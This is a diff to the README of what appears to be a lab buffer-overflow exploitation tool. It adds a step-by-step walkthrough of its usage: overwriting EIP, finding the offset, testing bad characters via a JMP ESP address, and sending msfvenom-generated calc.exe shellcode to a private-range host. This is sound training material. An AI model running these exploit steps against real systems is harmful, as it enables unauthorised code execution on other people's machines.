@@ -29,7 +29,7 @@ write - Write badchars (before or after offset content) for badchar verification
 
 exploit - Sends malicious payload via buffer overflow
 ```
-./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=payload --nops=10
+./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=opencalc --nops=10
 ```
 
 ## Parameters:
@@ -50,13 +50,34 @@ exploit - Sends malicious payload via buffer overflow
 * --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.
 * --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.
 * --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.
-* --shellcode	: Hex shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.
-  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f python EXITFUNC=thread -o payload
+* --shellcode	: Hex shell code file generated using msfvenom.
+  * Example: msfvenom -p windows/exec cmd=calc.exe -b '\x00' -f hex EXITFUNC=thread -o opencalc
 * --nops		: Amount of nops to add before and after the shell code. Default is 0.
 
 ## Vanilla Buffer Overflow example
 
-TODO
+1. Overwrite EIP
+```
+./ig-buffer-overflow.py -m test --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/'
+```
+
+2. Identify EIP offset
+```
+./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/'
+```
+
+3. Test for badchar (JMP ESP address 625012F0 found using !mona jmp -n -r ESP)
+```
+./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/' --offset=1203 --hexcontent=l625012F0 --badchar=after --exclude=00
+```
+
+4. Execute shell code
+```
+msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f hex EXITFUNC=thread -o mycalc
+
+./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=2048 --buffsize=5009 --buffhead='cmd1 /.:/' --offset=1203 --hexcontent=l625012F0 --shellcode=mycalc --nops=12
+```
+
 
 ## SEH Overwrite example
 
